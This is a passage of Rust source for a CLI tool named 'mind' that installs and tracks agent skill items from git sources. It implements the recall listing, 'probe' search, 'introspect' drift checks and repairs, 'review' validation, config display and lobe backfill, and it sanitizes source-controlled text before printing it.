        println!("no sources melded; run `mind meld <owner/repo>` to add one");
        // Fall through: unmanaged lobe items are still worth showing (UNM-2).
    }

    for s in &registry.sources {
        if !source_shown(s) {
            continue;
        }
        let items = cat_items(s);
        let orphans = orphans_of(s);
        if items.is_empty() && orphans.is_empty() && filtering {
            continue; // a filter excluded everything this source offers
        }
        let commit = s
            .commit
            .as_deref()
            .map(short)
            .unwrap_or_else(|| "unsynced".into());
        let ns = match &s.alias {
            Some(a) => format!(" namespace:{a}"),
            None => String::new(),
        };
        let hook = match s.install_hooks.len() {
            0 => String::new(),
            1 => " hook".to_string(),
            n => format!(" hooks({n})"),
        };
        // MKT-10: show the manifest origin in the source header so the
        // provenance is visible in the default recall view too.
        let origin = origin_label(s.origin);
        println!(
            "{} {}  {}{}",
            out.bullet(),
            out.bold(&s.name),
            out.dim(&format!("[{commit}{ns}{hook}{origin}]")),
            s.description
                .as_deref()
                .map(|d| format!("  {d}"))
                .unwrap_or_default()
        );
        // Each item is a status-marked row; print_rows aligns the key column even
        // with the leading glyph (its visible width ignores any ANSI codes).
        let mut rows: Vec<Vec<String>> = Vec::new();
        for it in items {
            let key = it.display_key();
            // Match by stable identity (source, kind, bare_name), as source_status,
            // the single-item detail, and probe do, so a pure namespace/prefix
            // rename (effective name changed, bare identity unchanged) still
            // resolves to its manifest entry and is marked outdated rather than
            // misclassified as available + removed-upstream.
            let installed = manifest
                .items
                .values()
                .find(|m| m.source == it.source && m.kind == it.kind && m.bare_name == it.name);
            match installed {
                Some(m) => {
                    // CLI-75 / LIFE-11: mark out of date exactly when `upgrade`
                    // would act -- source-content hash changed, or effective name
                    // changed (rename). Commit advance alone does not trigger this.
                    // CLI-75: a hash error counts as drift (see the recall listing
                    // site); the marker errs toward flagging rather than hiding it.
                    let hash_lag = it.content_hash().map_or(true, |h| h != m.hash);
                    let rename_lag = it.effective_name() != m.name;
                    let lag = hash_lag || rename_lag;
                    let outdated = if lag {
                        format!("  {}", out.yellow("(outdated; run mind upgrade)"))
                    } else {
                        String::new()
                    };
                    // A stale install gets its own marker (↑), distinct from a
                    // current install (✓): installed but not up to date.
                    let marker = if lag { out.stale() } else { out.ok() };
                    rows.push(vec![
                        format!("  {marker}"),
                        key,
                        format!("installed @ {}{}", out.green(&short(&m.commit)), outdated),
                    ]);
                }
                None => rows.push(vec![
                    format!("  {}", out.available()),
                    out.dim(&key),
                    out.dim("available"),
                ]),
            }
        }
        for m in orphans {
            // spec: DSC-95
            rows.push(vec![
                format!("  {}", out.warn()),
                m.display_key(),
                format!(
                    "installed @ {} {}",
                    short(&m.commit),
                    out.yellow("(removed upstream)")
                ),
            ]);
        }
        out.print_rows(&rows);
    }

    // UNM-2: list unmanaged lobe items after the sources. Human view only;
    // `recall --json` keeps its sources-only schema (CLI-73). `--source` excludes
    // them (they have no source); `--kind` filters as it does managed items.
    if source.is_none() {
        let unmanaged: Vec<crate::unmanaged::UnmanagedItem> =
            crate::unmanaged::scan(paths, &manifest)?
                .into_iter()
                .filter(|u| kind.is_none_or(|k| u.kind == k))
                .collect();
        if !unmanaged.is_empty() {
            println!(
                "{} {}",
                out.bullet(),
                out.bold("unmanaged: not installed by mind")
            );
            let rows: Vec<Vec<String>> = unmanaged
                .iter()
                .map(|u| {
                    // spec: DSC-95 -- sanitize each path before
                    // joining, not the joined string after.
                    let where_ = u
                        .paths
                        .iter()
                        .map(|p| display_path(p))
                        .collect::<Vec<_>>()
                        .join(", ");
                    vec![
                        format!("  {}", out.warn()),
                        u.display_key(),
                        out.dim(&where_),
                    ]
                })
                .collect();
            out.print_rows(&rows);
        }
    }
    Ok(())
}

/// `mind probe [query] [--kind K] [--source S] [--json]`. A leading `*` marks
/// installed items; the hash is of the current source content. `--kind` and
/// `--source` narrow the listing and compose with the substring query. `--json`
/// emits the rows as JSON on stdout.
pub fn probe(
    paths: &Paths,
    query: Option<&str>,
    kind: Option<ItemKind>,
    source: Option<&str>,
    json: bool,
) -> Result<()> {
    let out = crate::render::ctx();
    // CLI-86: the `--source` glob filter shares `source_matches_glob`; reject a
    // malformed pattern up front rather than silently matching nothing.
    if let Some(s) = source {
        crate::resolve::validate_source_selector(s)?;
    }
    let registry = Registry::load(paths)?;
    let items = catalog::scan(paths, &registry)?;
    let manifest = Manifest::load(paths)?;
    let q = query.unwrap_or("");
    // Carry each hit's index in `items` alongside the reference: the DEP-62
    // adjacency field below needs it, and recovering it later would cost an
    // O(catalog) scan per row (L10).
    let mut hits: Vec<(usize, &CatalogItem)> = items
        .iter()
        .enumerate()
        .filter(|(_, it)| {
            catalog::matches_query(it, q) // spec: CLI-85
                && kind.is_none_or(|k| it.kind == k)
                // CLI-86: `--source` accepts a glob over source identities.
                && source.is_none_or(|s| source_matches_glob(&it.source, s))
        })
        .collect();
    hits.sort_by_key(|(_, a)| a.key());

    let installed = |it: &CatalogItem| {
        manifest
            .items
            .values()
            .any(|m| m.source == it.source && m.kind == it.kind && m.bare_name == it.name)
    };

    // UNM-3: unmanaged lobe items, matched by name (CLI-85) and `--kind`. A
    // `--source` filter excludes them, since they have no source.
    let mut unmanaged: Vec<crate::unmanaged::UnmanagedItem> = if source.is_none() {
        let needle = q.to_lowercase();
        crate::unmanaged::scan(paths, &manifest)?
            .into_iter()
            .filter(|u| kind.is_none_or(|k| u.kind == k) && u.name.to_lowercase().contains(&needle))
            .collect()
    } else {
        Vec::new()
    };
    unmanaged.sort_by_key(|u| u.key());

    if json {
        // spec: DEP-62
        // L10: one index for the whole document. Built per row this was an
        // O(catalog) index build plus an O(catalog) position scan each time,
        // i.e. quadratic in the catalog for a verb that lists every match.
        let dep_index = crate::deps::DepIndex::new(&items);
        let mut rows: Vec<ProbeRow> = hits
            .iter()
            .map(|(node, it)| {
                // DEP-62: add direct dependency keys to each catalog row.
                // DSC-95: keys embed source-controlled names; sanitize for the
                // `--json` document.
                let dependencies = dep_index
                    .direct_keys(*node, &read_item_text)
                    .iter()
                    .map(|k| crate::sanitize::strip_ansi(k))
                    .collect();
                ProbeRow {
                    installed: installed(it),
                    kind: it.kind.as_str(),
                    name: it.display_effective_name(),
                    source: crate::sanitize::strip_ansi(&it.source),
                    hash: it.content_hash().ok(),
                    description: it.description.as_deref().map(crate::sanitize::strip_ansi),
                    unmanaged: false,
                    dependencies,
                }
            })
            .collect();
        for u in &unmanaged {
            rows.push(ProbeRow {
                installed: false,
                kind: u.kind.as_str(),
                name: crate::sanitize::strip_ansi(&u.name),
                source: String::new(),
                hash: None,
                description: None,
                unmanaged: true,
                dependencies: Vec::new(),
            });
        }
        // spec: CLI-167 - array wrapped in versioned envelope.
        return print_json_envelope(&rows);
    }

    if hits.is_empty() && unmanaged.is_empty() {
        if registry.sources.is_empty() {
            // spec: CLI-187
            println!("no sources melded; run `mind meld <owner/repo>` to add one");
        } else {
            println!("no items match '{q}'");
        }
        return Ok(());
    }

    // spec: DEP-62
    // Human listing: nest each hit's transitive dependencies beneath it. Build a
    // graph over all catalog items (an always-true membership makes every item
    // a node), then render_subtree for each hit.
    let catalog_graph = crate::deps::installed_graph(&items, |_| true, read_item_text);

    let mut rows = Vec::new();
    for (_, it) in &hits {
        let cur = it.content_hash().ok();
        let hash = cur.as_deref().map(short).unwrap_or_else(|| "-".into());
        // The matched installed item, if any, for the install marker and the
        // out-of-date check (CLI-75).
        let m = manifest
            .items
            .values()
            .find(|m| m.source == it.source && m.kind == it.kind && m.bare_name == it.name);
        // CLI-75 / LIFE-11: mark out of date exactly when `upgrade` would
        // act -- source-content hash changed, or effective name changed
        // (rename). Commit advance alone does not trigger this.
        let outdated = m.is_some_and(|m| {
            // CLI-75: a hash error (cur == None) counts as drift; the marker
            // errs toward flagging rather than reading "cannot hash" as up to
            // date, consistent with the other three marker sites.
            let hash_drift = cur.as_deref().is_none_or(|h| h != m.hash);
            let rename_drift = it.effective_name() != m.name;
            hash_drift || rename_drift
        });
        // CLI-81: a leading `*` marks an installed item (greened when color is
        // on). Not-installed rows have an empty marker cell so the row does not
        // start with `*`.
        let marker = if m.is_some() {
            out.green("*")
        } else {
            String::new()
        };
        let mut desc = summary(it.description.as_deref(), 60);
        if outdated {
            desc = format!("{desc} {}", out.yellow("(outdated; run `mind upgrade`)"));
        }
        rows.push(vec![
            marker,
            it.display_key(),
            out.dim(&it.source),
            out.dim(&hash),
            desc,
        ]);

        // DEP-62: nest transitive dependencies beneath each hit. Use the
        // catalog graph to render a subtree; each dependency line is indented
        // with two leading spaces so it reads as a child of the hit above.
        // Cycle back-edges are marked (cycle) by render_subtree/render_forest.
        if let Some(subtree) = catalog_graph.render_subtree(it.key().as_str()) {
            // The subtree includes the root (it.key()) at depth 0; skip it
            // and emit only the nested child lines (depth >= 1).
            for line in subtree.lines().skip(1) {
                rows.push(vec![
                    String::new(),
                    // DSC-95: the rendered subtree embeds dependency names.
                    crate::sanitize::strip_ansi(line),
                    String::new(),
                    String::new(),
                    String::new(),
                ]);
            }
        }
    }
    // UNM-3: unmanaged rows are marked in the source column and carry their lobe
    // path in place of a description. No dependency nesting for unmanaged items.
    for u in &unmanaged {
        // spec: DSC-95 -- sanitize each path before joining, not the
        // joined string after.
        let where_ = u
            .paths
            .iter()
            .map(|p| display_path(p))
            .collect::<Vec<_>>()
            .join(", ");
        rows.push(vec![
            String::new(),
            u.display_key(),
            out.dim("(unmanaged)"),
            out.dim("-"),
            out.dim(&where_),
        ]);
    }
    out.print_rows(&rows);
    Ok(())
}

/// One `probe --json` row. `unmanaged` is omitted for managed (catalog) rows, so
/// the existing schema is unchanged; an unmanaged row sets it true with no
/// `hash` and an empty `source`. `dependencies` lists the direct dependency keys
/// for catalog (managed) rows (DEP-62); empty for unmanaged rows.
#[derive(Serialize)]
struct ProbeRow<'a> {
    installed: bool,
    kind: &'a str,
    name: String,
    // spec: DSC-95 -- owned and sanitized (not `&'a str` borrowed
    // straight from the catalog item): the source name and description are
    // both source-controlled text.
    source: String,
    hash: Option<String>,
    description: Option<String>,
    #[serde(skip_serializing_if = "std::ops::Not::not")]
    unmanaged: bool,
    /// Direct dependency keys (DEP-62). Empty for unmanaged rows. Omitted when
    /// the vec is empty so existing consumers that do not need deps see no change.
    #[serde(skip_serializing_if = "Vec::is_empty")]
    dependencies: Vec<String>,
}

/// One diagnostic finding from `introspect`. `kind` is a stable machine tag;
/// `message` is the human line.
#[derive(Serialize)]
struct Issue {
    kind: &'static str,
    target: String,
    message: String,
}

/// `mind introspect [--fix] [--json]` — report drift and breakage. With `--fix`,
/// repair what can be fixed without changing versions: recreate missing symlinks
/// from each item's file registry. Drifted or renamed items are left to
/// `upgrade`. `--json` emits the findings as JSON on stdout.
pub fn introspect(paths: &Paths, fix: bool, json: bool) -> Result<()> {
    let registry = Registry::load(paths)?;
    let mut manifest = Manifest::load(paths)?;
    let mut issues: Vec<Issue> = Vec::new();
    // spec: CLI-210 -- a source whose clone is missing or otherwise unscannable
    // (e.g. an item-link instance whose linked path vanished) must not abort
    // the whole run: scan each source independently, report the failure as a
    // "source-scan-failed" issue, and keep going with a partial catalog built
    // from the sources that DID scan successfully.
    let mut catalog: Vec<CatalogItem> = Vec::new();
    for s in &registry.sources {
        if let Err(e) = catalog::scan_source(paths, s, &mut catalog) {
            issues.push(Issue {
                kind: "source-scan-failed",
                target: s.name.clone(),
                message: format!("source '{}' could not be scanned: {e}", s.name),
            });
        }
    }
    let mut repaired: Vec<String> = Vec::new();
    // HARN-8: `--fix` may create new lobe links; record whether we mutated the
    // manifest so it is saved once after the loop.
    let mut manifest_dirty = false;

    // HARN-13: check for vanished lobes (configured lobes whose parent dir is
    // gone) before computing all_lobes, so --fix can prune them from config and
    // the subsequent relink loop sees only live lobes.
    //
    // spec: HARN-13
    // spec: HARN-18 -- a vanished-lobe finding that this same `--fix` run repairs
    // (prunes from config) must not also be counted as an outstanding issue: track
    // the targets actually pruned and drop their findings below, so the exit
    // summary counts only what remains.
    let mut repaired_vanished_lobes: std::collections::HashSet<String> =
        std::collections::HashSet::new();
    {
        let cfg_result = Config::load(paths);
        if let Ok(mut cfg) = cfg_result
            && !cfg.lobes.is_empty()
        {
            let mut pruned = false;
            for entry in &cfg.lobes {
                let lobe = crate::paths::Lobe {
                    path: std::path::PathBuf::from(entry.path()),
                    kinds: entry.kinds().map(|ks| ks.to_vec()),
                };
                if !lobe.reachable() {
                    issues.push(Issue {
                        kind: "vanished-lobe",
                        target: entry.path().to_string(),
                        message: format!(
                            "lobe '{}' parent dir is gone; \
                                 run `mind introspect --fix` to prune it",
                            entry.path()
                        ),
                    });
                    if fix {
                        // Strip manifest links confined under this lobe.
                        let lobe_pb = std::path::PathBuf::from(entry.path());
                        for item in manifest.items.values_mut() {
                            let before = item.links.len();
                            item.links
                                .retain(|l| !std::path::Path::new(l).starts_with(&lobe_pb));
                            if item.links.len() != before {
                                manifest_dirty = true;
                            }
                        }
                        pruned = true;
                        repaired_vanished_lobes.insert(entry.path().to_string());
                    }
                }
            }
            if fix && pruned {
                cfg.lobes.retain(|e| {
                    let lobe = crate::paths::Lobe {
                        path: std::path::PathBuf::from(e.path()),
                        kinds: e.kinds().map(|ks| ks.to_vec()),
                    };
                    lobe.reachable()
                });
                cfg.save(paths)?;
                repaired.push("pruned vanished lobe(s) from config".to_string());
            }
        }
    }
    // spec: HARN-18 -- drop each vanished-lobe finding this run repaired, so it
    // is not both reported as fixed (above) and counted as an outstanding issue.
    if !repaired_vanished_lobes.is_empty() {
        issues.retain(|i| {
            !(i.kind == "vanished-lobe" && repaired_vanished_lobes.contains(&i.target))
        });
    }

    let all_lobes = paths.agent_homes()?;
    // For HARN-8 checks, only consider lobes whose parent dir still exists (skip
    // vanished lobes so they don't generate spurious missing-lobe-link findings).
    let live_lobes: Vec<crate::paths::Lobe> =
        all_lobes.into_iter().filter(|l| l.reachable()).collect();

    for s in &registry.sources {
        if !s.clone_dir(paths).join(".git").is_dir() {
            issues.push(Issue {
                kind: "no-clone",
                target: s.name.clone(),
                message: format!("source '{}' has no clone on disk; run `mind sync`", s.name),
            });
        } else if s.commit.is_none() {
            issues.push(Issue {
                kind: "never-synced",
                target: s.name.clone(),
                message: format!("source '{}' was never synced; run `mind sync`", s.name),
            });
        }
    }

    for it in manifest.items.values_mut() {
        let missing: Vec<String> = it
            .links
            .iter()
            .filter(|link| std::fs::symlink_metadata(link).is_err())
            .cloned()
            .collect();
        if !missing.is_empty() {
            // With --fix, re-link from the store copy; report only what cannot
            // be repaired (e.g. the store copy itself is gone).
            let n = if fix { install::relink(paths, it)? } else { 0 };
            if n > 0 {
                repaired.push(format!(
                    "{}: relinked {n} missing symlink(s)",
                    it.key().as_str()
                ));
            }
            for link in &missing {
                if std::fs::symlink_metadata(link).is_err() {
                    issues.push(Issue {
                        kind: "missing-link",
                        target: it.key().into(),
                        message: format!("{}: symlink missing at {link}", it.key().as_str()),
                    });
                }
            }
        }
        // HARN-8: check that the item is linked into every configured lobe that
        // admits its kind. A link that is in the manifest but not on disk is
        // already handled above (missing-link). This checks for lobes that were
        // added after the item was installed -- the link would be absent from
        // both the manifest and disk. Use live_lobes so vanished lobes don't
        // generate spurious missing-lobe-link findings (HARN-13).
        let link_rel = it
            .links
            .iter()
            .find_map(|link_str| {
                let link = std::path::Path::new(link_str);
                live_lobes
                    .iter()
                    .find_map(|lobe| link.strip_prefix(&lobe.path).ok())
                    .map(|rel| rel.to_string_lossy().into_owned())
            })
            .or_else(|| paths.default_link_rel(it.kind, &it.name));
        if let Some(rel) = link_rel {
            for lobe in &live_lobes {
                if !lobe.admits(it.kind) {
                    continue;
                }
                let expected = lobe.path.join(&rel);
                let expected_str = expected.to_string_lossy().into_owned();
                let in_manifest = it.links.iter().any(|l| l == &expected_str);
                let on_disk = std::fs::symlink_metadata(&expected).is_ok();
                if in_manifest && on_disk {
                    continue;
                }
                if fix {
                    // HARN-17: `introspect --fix` has no `--force` flag, so a
                    // foreign file at the target is reported (below), never
                    // clobbered.
                    let (created, errs) =
                        install::link_into_new_lobes(paths, it, std::slice::from_ref(lobe), false);
                    if !created.is_empty() {
                        it.links.extend(
                            created
                                .into_iter()
                                .map(|p| p.to_string_lossy().into_owned()),
                        );
                        manifest_dirty = true;
                        repaired.push(format!(
                            "{}: linked into new lobe {}",
                            it.key().as_str(),
                            lobe.path.display()
                        ));
                    }
                    for (p, e) in errs {
                        issues.push(Issue {
                            kind: "missing-lobe-link",
                            target: it.key().into(),
                            message: format!("{}: {e}", p.display()),
                        });
                    }
                } else {
                    issues.push(Issue {
                        kind: "missing-lobe-link",
                        target: it.key().into(),
                        message: format!(
                            "{}: not linked into lobe {}; run `mind introspect --fix`",
                            it.key().as_str(),
                            lobe.path.display()
                        ),
                    });
                }
            }
        }
        // Match on stable identity (source, kind, bare_name).
        match catalog
            .iter()
            .find(|c| c.kind == it.kind && c.name == it.bare_name && c.source == it.source)
        {
            None => issues.push(Issue {
                kind: "removed-upstream",
                target: it.key().into(),
                message: format!(
                    "{}: no longer present in source '{}'",
                    it.key().as_str(),
                    it.source
                ),
            }),
            Some(cat) => {
                if cat.effective_name() != it.name {
                    issues.push(Issue {
                        kind: "namespace-changed",
                        target: it.key().into(),
                        message: format!(
                            "{}: namespace changed to '{}'; run `mind upgrade`",
                            it.key().as_str(),
                            cat.effective_name()
                        ),
                    });
                } else if let Ok(h) = cat.content_hash()
                    && h != it.hash
                {
                    issues.push(Issue {
                        kind: "drifted",
                        target: it.key().into(),
                        message: format!(
                            "{}: upstream changed; run `mind upgrade`",
                            it.key().as_str()
                        ),
                    });
                }
            }
        }
    }

    // spec: LNK-19 -- an item installed with a dropped requirement (LNK-18) is
    // degraded, not broken, so it is reported as an issue `--fix` cannot repair:
    // the only fix is to replace the link with the whole repo, which is the
    // user's call (it changes which sources are registered). Reported after the
    // structural checks so it never displaces a broken link or a missing store.
    for it in manifest.items.values() {
        if it.dropped_requires.is_empty() {
            continue;
        }
        // spec: DSC-95 -- sanitize each source-controlled field BEFORE it is
        // composed into the message. The batch sanitize further down runs on
        // the already-joined string, which is too late: an identity or a
        // `requires` entry ending in a dangling escape introducer would swallow
        // the text that follows it.
        let source = strip_ansi(&it.source);
        let listed: String = it
            .dropped_requires
            .iter()
            .map(|e| strip_ansi(e))
            .collect::<Vec<_>>()
            .join(", ");
        issues.push(Issue {
            kind: "dropped-requires",
            target: it.key().into(),
            // No pasteable command carries the source identity: `recall`'s
            // positional resolves an ITEM against the manifest, so
            // `mind recall <source>` is not a command at all (H2), and
            // `mind recall --sources` needs no interpolation to be correct.
            message: format!(
                "{}: installed from a single-item link (source '{source}'), so its \
                 `requires {listed}` was dropped and the item it names is not installed; \
                 meld the whole repo to get both (`mind recall --sources` lists the melded \
                 sources)",
                it.display_key(),
            ),
        });
    }

    if fix && manifest_dirty {
        manifest.save(paths)?;
    }

    // spec: DSC-95 -- every issue's `target`/`message`, and every
    // `repaired` note, can embed a source-controlled name (an item key, a
    // source name, a lobe path): sanitize once here, covering both the
    // `--json` `Report` below and the human `println!` loop further down,
    // rather than at each of this function's dozen build sites above.
    for issue in &mut issues {
        issue.target = strip_ansi(&issue.target);
        issue.message = strip_ansi(&issue.message);
    }
    for note in &mut repaired {
        *note = strip_ansi(note);
    }

    if json {
        #[derive(Serialize)]
        struct Report<'a> {
            // spec: CLI-189 - schema version; always 1.
            schema: u8,
            issues: &'a [Issue],
            sources: usize,
            items: usize,
        }
        return print_json(&Report {
            schema: 1,
            issues: &issues,
            sources: registry.sources.len(),
            items: manifest.items.len(),
        });
    }

    let out = crate::render::ctx();
    for note in &repaired {
        println!("{} {note}", out.ok());
    }
    for issue in &issues {
        println!("{} {}", out.warn(), issue.message);
    }
    if issues.is_empty() {
        println!(
            "{} all good: {} source(s), {} item(s) installed",
            out.ok(),
            registry.sources.len(),
            manifest.items.len()
        );
    } else {
        println!("\n{} {} issue(s) found", out.err(), issues.len());
    }
    Ok(())
}

/// `mind review <target> [--as <prefix>]` — validate a source for publishing.
///
/// Read-only. Collects hard errors and advisory findings; hard errors cause a
/// non-zero exit (CLI-132). Installs nothing and changes nothing on disk.
///
/// spec: CLI-130, CLI-131, CLI-132, CLI-133
pub fn review(paths: &Paths, target: &str, alias: Option<String>, fix: bool) -> Result<()> {
    let result = crate::review::review(paths, target, alias, fix)?;

    // Print hard then advisory findings in the shared format. Unconditional
    // even under `--json`: CLI-217's fd redirect routes it to stderr instead
    // of dropping it, exactly like every other verb's advisory output.
    crate::review::print_findings(&result.hard, &result.advisory);

    let out = crate::render::ctx();
    // Report any files `--fix` rewrote.
    for f in &result.fixed {
        println!("{} fixed {f}", out.ok());
    }

    if json_mode() {
        return emit_review_json(&result);
    }

    if result.hard.is_empty() {
        if result.advisory.is_empty() {
            println!("{} review: no issues found", out.ok());
        } else {
            println!(
                "{} review: {} advisory finding(s); source is publishable",
                out.warn(),
                result.advisory.len()
            );
        }
        Ok(())
    } else {
        println!(
            "\n{} review: {} hard error(s), {} advisory finding(s)",
            out.err(),
            result.hard.len(),
            result.advisory.len()
        );
        Err(crate::error::MindError::ReviewFailed {
            hard: result.hard.len(),
        })
    }
}

/// `mind review --policy <path>` — validate a managed policy file, dispatching
/// to the JSON or text implementation.
///
/// Both `review::dispatch_policy` (text) and `review::review_policy` (JSON, via
/// this wrapper) are exercised from here, so neither `review.rs` function goes
/// unused in a bin crate (clippy `-D warnings` flags an orphaned `pub fn`).
///
/// spec: CLI-219 POL-50
pub fn review_policy_dispatch(path: &std::path::Path) -> Result<()> {
    if !json_mode() {
        return crate::review::dispatch_policy(path);
    }
    let result = crate::review::review_policy(path)?;
    emit_review_json(&result)
}

/// One `review` finding, JSON shape (CLI-219): the machine-stable `kind` tag
/// and the human message, exactly what the text mode prints as
/// `error [kind]: message` / `advisory [kind]: message`.
#[derive(Serialize)]
struct ReviewFindingJson<'a> {
    kind: &'a str,
    message: &'a str,
}

/// `mind review --json`'s result document (CLI-219).
#[derive(Serialize)]
struct ReviewJson<'a> {
    schema: u8,
    action: &'static str,
    outcome: &'static str,
    hard: Vec<ReviewFindingJson<'a>>,
    advisory: Vec<ReviewFindingJson<'a>>,
    fixed: &'a [String],
}

fn review_json_document(result: &crate::review::ReviewResult) -> ReviewJson<'_> {
    let outcome = if !result.hard.is_empty() {
        "failed"
    } else if !result.advisory.is_empty() {
        "advisory"
    } else {
        "clean"
    };
    fn finding_json(f: &crate::review::Finding) -> ReviewFindingJson<'_> {
        ReviewFindingJson {
            kind: f.kind,
            message: &f.message,
        }
    }
    ReviewJson {
        schema: 1,
        action: "review",
        outcome,
        hard: result.hard.iter().map(finding_json).collect(),
        advisory: result.advisory.iter().map(finding_json).collect(),
        fixed: &result.fixed,
    }
}

/// Emit `mind review --json`'s result document: `outcome: "clean"` when there
/// are no findings at all, `"advisory"` when only advisory findings exist.
/// Hard findings still fail `review` regardless of `--json` (CLI-132); the
/// document (with `outcome: "failed"`) is recorded as the CLI-181 error
/// envelope's `details` member (CLI-221) instead of printed as a success
/// envelope, so a machine caller sees exactly what failed on the non-zero
/// exit.
///
/// spec: CLI-219 CLI-221
fn emit_review_json(result: &crate::review::ReviewResult) -> Result<()> {
    let doc = review_json_document(result);
    if !result.hard.is_empty() {
        crate::json_stdout::record_error_details(&doc);
        return Err(crate::error::MindError::ReviewFailed {
            hard: result.hard.len(),
        });
    }
    print_json(&doc)
}

/// `mind config show` — print the config file location and its key/value pairs.
pub fn config_show(paths: &Paths) -> Result<()> {
    let out = crate::render::ctx();
    paths.ensure_config()?;
    let file = paths.config_file();
    let cfg = Config::load(paths)?;
    if out.json {
        return print_json(&serde_json::json!({
            "config_file": file.display().to_string(),
            "lobes": cfg.lobes,
            "default_lobe": paths.claude_home.display().to_string(),
            "ssh": cfg.ssh,
        }));
    }
    println!("{} config file: {}", out.bullet(), file.display());
    if cfg.lobes.is_empty() {
        println!(
            "  {} lobes = []  (default: {})",
            out.dim("·"),
            paths.claude_home.display()
        );
    } else {
        let rendered: Vec<String> = cfg.lobes.iter().map(format_lobe).collect();
        println!("  {} lobes = {}", out.dim("·"), rendered.join(", "));
    }
    println!(
        "  {} ssh = {}  (prefer SSH for melded remotes)",
        out.dim("·"),
        cfg.ssh
    );
    if let Some(env) = std::env::var_os("MIND_AGENT_HOMES") {
        println!(
            "note: MIND_AGENT_HOMES is set and overrides lobes: {}",
            env.to_string_lossy()
        );
    }
    Ok(())
}

/// Render a lobe entry for display: the path, plus its `kinds` filter in brackets
/// when present (HARN-1). A no-kinds lobe shows just the path (it admits all).
fn format_lobe(entry: &crate::config::LobeEntry) -> String {
    match entry.kinds() {
        None => entry.path().to_string(),
        Some(kinds) => {
            let names: Vec<&str> = kinds.iter().map(|k| k.as_str()).collect();
            format!("{} [{}]", entry.path(), names.join(", "))
        }
    }
}

/// Backfill all installed items into `new_lobes`. Called after a lobe is added
/// so existing items also land in the new home.
///
/// spec: HARN-17 -- for a lobe registered in fan-out mode (today's only mode),
/// this runs unconditionally in every invocation mode (`--yes`, an interactive
/// TTY, a non-interactive non-TTY context, and `--json`): it never prompts and
/// never defers to `introspect --fix`. A pre-existing foreign file at a backfill
/// target is never clobbered unless `force` is set: `link_into_new_lobes` guards
/// each target with the same `ensure_unoccupied` check used at install time
/// (LIFE-41), and a blocked target surfaces as an ordinary failure (naming the
/// `--force` remedy) in the `errs` list printed below as a warning, rather than
/// overwriting it.
fn backfill_new_lobes(paths: &Paths, new_lobes: &[crate::paths::Lobe], force: bool) -> Result<()> {
    let mut manifest = Manifest::load(paths)?;
    if manifest.items.is_empty() {
        return Ok(());
    }

    for item in manifest.items.values_mut() {
        let (created, errs) = install::link_into_new_lobes(paths, item, new_lobes, force);
        item.links.extend(
            created
                .into_iter()
                .map(|p| p.to_string_lossy().into_owned()),
        );
        for (p, e) in errs {
            // spec: CLI-217 -- HARN-17 runs this backfill under `--json` too, and
            // the caller prints its JSON result AFTER this loop, so a bare
            // `println!` here would land ahead of the envelope on stdout.
            crate::render::warn(format!("could not link {}: {e}", p.display()));
        }
    }
    manifest.save(paths)?;
    Ok(())
}

/// Convert detected-lobe candidates (name + config entry) into resolved
/// [`Lobe`]s for backfill (HARN-7). Each entry's path is used verbatim (the
/// detection base produces absolute paths) with its declared `kinds` filter.
fn candidates_to_lobes(
    candidates: &[(&'static str, crate::config::LobeEntry)],
) -> Vec<crate::paths::Lobe> {
    candidates
        .iter()
        .map(|(_, entry)| crate::paths::Lobe {
            path: std::path::PathBuf::from(entry.path()),
            kinds: entry.kinds().map(|ks| ks.to_vec()),
        })
        .collect()
}

/// Unified add path for `config lobes add` and `link-project`.
///
/// Calls `resolve_lobe(base, preset, subdir)` to get `(lobe, preset_opt)`.
///
/// - snapshot=true: materialize frozen real-file copies of admitted items into
///   the lobe path; do NOT register a config entry (HARN-12).
/// - snapshot=false (default): register the lobe in config, preserve HARN-9
///   claude_home, run the HARN-7 backfill offer, print gitignore guidance for
///   a project lobe (HARN-11).
// spec: HARN-10 HARN-11 HARN-12
pub fn lobe_add_resolved(
    paths: &Paths,
    base: Option<&str>,
    preset: Option<&str>,
    subdir: Option<&str>,
    snapshot: bool,
    force: bool,
    // Retained for call-site compatibility (main.rs dispatches positionally);
    // no longer read here. The HARN-7 backfill is unconditional in every mode
    // (HARN-17), so a confirmation flag no longer gates it.
    _yes: bool,
) -> Result<()> {
    use crate::paths::{Scope, resolve_lobe};

    let out = crate::render::ctx();
    // POL-40: a lobe lock pins the effective agent homes; refuse and change
    // nothing. Load the policy first so the refusal precedes any config write.
    if let Some(policy) = Policy::load()?
        && policy.lobes_lock()
    {
        return Err(lobes_locked_error("add"));
    }

    // When a preset name is given, validate it up-front via `preset_lobe`
    // (fast path for unknown-preset errors before any config write). The full
    // `resolve_lobe` call below re-uses the same lookup and handles `base`.
    if let Some(name) = preset {
        Paths::preset_lobe(name)?; // validate; result discarded, resolve_lobe handles base
    }
    let (lobe, preset_opt) = resolve_lobe(base, preset, subdir)?;
    let path_str = lobe.path.to_string_lossy().into_owned();

    if snapshot {
        // HARN-12: snapshot mode -- write frozen real-file copies, no config entry.
        let manifest = Manifest::load(paths)?;
        let agent_homes = paths.agent_homes()?;
        let mut copied = 0usize;
        let mut frozen_keys: Vec<String> = Vec::new();
        for item in manifest.items.values() {
            // Respect the lobe's kinds filter.
            if !lobe.admits(item.kind) {
                continue;
            }
            // Determine the relative link path (mirrors link_into_new_lobes).
            let link_rel = item
                .links
                .iter()
                .find_map(|link_str| {
                    let link = std::path::Path::new(link_str);
                    agent_homes
                        .iter()
                        .find_map(|h| link.strip_prefix(&h.path).ok())
                        .map(|rel| rel.to_string_lossy().into_owned())
                })
                .or_else(|| paths.default_link_rel(item.kind, &item.name));
            let link_rel = match link_rel {
                Some(r) => r,
                None => continue,
            };
            let dst = lobe.path.join(&link_rel);
            let store_src = paths.mind_home.join(&item.store);
            // Collision check (mirrors LIFE-41).
            if std::fs::symlink_metadata(&dst).is_ok() {
                if !force {
                    return Err(MindError::LinkOccupied {
                        path: dst.to_string_lossy().into_owned(),
                    });
                }
                // Force: remove the existing target before copying.
                if dst.is_dir() {
                    std::fs::remove_dir_all(&dst).map_err(|e| MindError::io(&dst, e))?;
                } else {
                    std::fs::remove_file(&dst).map_err(|e| MindError::io(&dst, e))?;
                }
            }
            install::copy_recursive(&store_src, &dst)?;
            copied += 1;
            // spec: DSC-95 -- `result.installed` below rides straight into the
            // `--json` envelope with no sanitizing step of its own (mirrors the
            // `learn()`/`sync` pattern of sanitizing before assigning to a
            // `--json` field), so sanitize here at collection.
            frozen_keys.push(item.key().display());
        }
        // spec: HARN-14 -- machine-readable snapshot result under --json, in place
        // of the prose lines. `outcome` is `snapshot` when anything was frozen,
        // else `no-op`; `count` and `installed` (sorted keys) report what was written.
